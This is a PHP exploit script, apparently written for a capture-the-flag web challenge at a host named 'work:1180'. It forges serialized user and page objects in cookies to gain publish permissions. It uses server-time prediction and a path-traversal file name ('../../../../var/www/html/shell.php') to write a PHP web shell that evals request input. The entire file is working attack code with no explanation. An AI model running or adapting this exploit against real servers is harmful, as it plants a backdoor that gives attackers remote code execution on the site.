<?php

#require "models.php";

$URL = "http://work:1180/";
$TIME_WINDOW = 2.000;
$TIME_OFFSET = 150.000;
$PAYLOAD = "<?php eval(\$_REQUEST[1]);";

class User {
    public $name;
    public $perms;
    public function __construct($name){
        $this->name = $name;
    }
}

class Page {
    public $vars;
    public $text;
    public $view;
    public $header;
    public $template = "main"; 
}



function gen_payload($payload){
    $expl = false;

    for ($i=0; $i<strlen($payload); $i++){
        $p = new Page("main");
        $p->text= $payload[$i];
        $p->vars["text"] = &$p->view;

        if (!$expl)
            $expl = $p;
        else {
            $p->header = $expl;
            $expl = $p;
        }
    }

    return serialize($expl);
}

function upload_pld($pld){
    global $URL;
    $pld = urlencode(gen_payload($pld));
    $user = new User("test");
    $user->perms = 4;
    $user = urlencode(serialize($user));
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, "$URL?m=Publish");

    //curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:8080");

    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_COOKIE, "user=$user; draft=$pld");

    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "fname=a./../../../../var/www/html/shell.php");
    curl_exec($ch);
}

function create_dir($name){
    global $URL;
    $user = urlencode(serialize(new User($name)));
    $page = new Page("test");
    $page->header = new Page("header");
    $page = urlencode(serialize($page));
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, "$URL?m=Publish");

    //curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:8080");

    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_COOKIE, "user=$user; draft=$page");

    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "fname=a.html");
    curl_exec($ch);
}

function get_server_time(){
    global $URL;
    $user = new User("test");
    $user->perms = 4;
    $user = urlencode(serialize($user));
    $page = new Page("test");
    $page->header = new Page("header");
    $page = urlencode(serialize($page));

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "$URL?m=ViewDraft");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    //curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:8080");

    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_COOKIE, "user=$user; draft=$page");

    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "fname=a.html");

    $res = curl_exec($ch);
    preg_match('/Rendered at: ([0-9\.]+)/', $res, $m);
    return floatval($m[1]);
   
}


$server_time = get_server_time();
echo "[+] Got server time: $server_time\n";
$diff = microtime(true) - $server_time;
echo "[*] Creating directories...\n";
create_dir("test");
for ($i = 0; $i < $TIME_WINDOW; $i += 0.0001){
    create_dir( "test/".($server_time + $TIME_OFFSET  + $i).".");
    $progress = intval($i/$TIME_WINDOW*100);
    echo "$progress%\r";

}
echo "[+] Done\n";
echo "[*] Waiting...\n";
while (1) {
    $t = microtime(true);
    $t -= $diff;
    if ($t >= $server_time + $TIME_OFFSET-1)
        break;
}
echo "[*] Trying to upload payload...\n";
while (1) {
    $t = microtime(true);
    $t -= $diff;
    upload_pld($PAYLOAD);
    if ($t >= $server_time + $TIME_OFFSET + $TIME_WINDOW +1)
        break;

}
echo "[*] Finished\n";







